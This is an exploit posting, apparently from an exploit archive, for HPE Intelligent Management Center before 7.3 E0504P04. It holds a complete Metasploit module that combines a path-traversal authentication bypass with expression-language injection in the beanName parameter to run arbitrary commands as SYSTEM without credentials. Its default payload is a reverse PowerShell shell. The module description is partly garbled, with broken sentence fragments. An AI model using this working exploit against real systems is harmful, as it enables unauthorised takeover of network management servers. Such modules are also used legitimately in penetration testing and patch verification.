# Date: 6 February, 2018
# Exploit Author: TrendyTofu
# Vendor Homepage: https://www.hpe.com/us/en/home.html
# Software Link: http://h10145.www1.hpe.com/Downloads/SoftwareReleases.aspx?ProductNumber=JG747AAE&lang=en&cc=us&prodSeriesId=4176535
# Version: prior to 7.3 E0504P04
# Tested on: iMC PLAT v7.3 (E0504P02), Windows Server 2012R2 x64 (EN)
# CVE : CVE-2017-8982, CVE-2017-12500
# Reference:
https://www.thezdi.com/blog/2018/2/6/one-mans-patch-is-another-mans-treasure-a-tale-of-a-failed-hpe-patch
 
Metasploit module also hosted on Github.  Posted below for reference:
https://raw.githubusercontent.com/thezdi/scripts/master/msf/hp_imc_el_injection_rce.rb
 
 
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;HPE iMC EL Injection Unauthenticated RCE&#039;,
      &#039;Description&#039;    => %q{
vulnerablity, along with
        an authentication bypass vulnerability in Hewlett Packard
Enterprise Intelligent
        Management Center before version 7.3 E0504P04 to achieve
remote code execution.
 
        The HP iMC server suffers from multiple vulnerabilities allows
unauthenticated
beanName parameter,
        allowing execution of arbitrary operating system commands as
SYSTEM. This service
        listens on TCP port 8080 and 8443 by default.
 
        This module has been tested successfully on iMC PLAT v7.3
(E0504P02) on Windows
        2k12r2 x64 (EN).
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;mr_me&#039;, # Discovery
          &#039;trendytofu&#039; # Metasploit
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2017-8982&#039;],
          [&#039;ZDI&#039;, &#039;18-139&#039;],
          [&#039;URL&#039;,
&#039;https://support.hpe.com/hpsc/doc/public/display?docId=emr_na-hpesbhf03809en_us&#039;],
          [&#039;CVE&#039;, &#039;2017-12500&#039;],
          [&#039;ZDI&#039;, &#039;17-663&#039;],
          [&#039;URL&#039;,
&#039;https://support.hpe.com/hpsc/doc/public/display?docId=emr_na-hpesbhf03768en_us&#039;]
        ],
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Targets&#039;        => [
                            [ &#039;Windows&#039;,
                              {
                                &#039;Arch&#039; => [ ARCH_CMD],
                                &#039;Platform&#039; => &#039;win&#039;
                              }
                            ]
                          ],
      &#039;Privileged&#039;     => true,
      &#039;DisclosureDate&#039; => &#039;Jan 25 2018&#039;,
      &#039;DefaultOptions&#039; =>
        {
          &#039;Payload&#039; => &#039;cmd/windows/reverse_powershell&#039;
        },
      &#039;DefaultTarget&#039;  => 0))
    register_options [Opt::RPORT(8080)]
  end
 
  def check
    res = send_request_raw({&#039;uri&#039;  => &#039;/imc/login.jsf&#039; })
 
    return CheckCode::Detected if res && res.code == 200
 
    CheckCode::Unknown
  end
 
  def get_payload(cmd)
    %q|facesContext.getExternalContext().redirect(%22%22.getClass().forName(%22javax.script.ScriptEngineManager%22).newInstance().getEngineByName(%22JavaScript%22).eval(%22var%20proc=new%20java.lang.ProcessBuilder[%5C%22(java.lang.String[])%5C%22]([%5C%22cmd.exe%5C%22,%5C%22/c%5C%22,%5C%22|+cmd+%q|%5C%22]).start();%22))|
  end
 
  def execute_command(payload)
    res = send_request_raw({ &#039;uri&#039; =>
"/imc/primepush/%2e%2e/ict/export/ictExpertDownload.xhtml?beanName=#{payload}"
})
    fail_with(Msf::Module::Failure::UnexpectedReply, "Injection
failed") if res && res.code != 302
    print_good "Command injected successfully!"
  end
 
  def exploit
    cmd = payload.encoded
    cmd.gsub!(&#039;cmd.exe /c &#039;,&#039;&#039;)
    cmd = Rex::Text.uri_encode(cmd)
 
    print_status "Sending payload..."
    execute_command get_payload cmd
  end
end

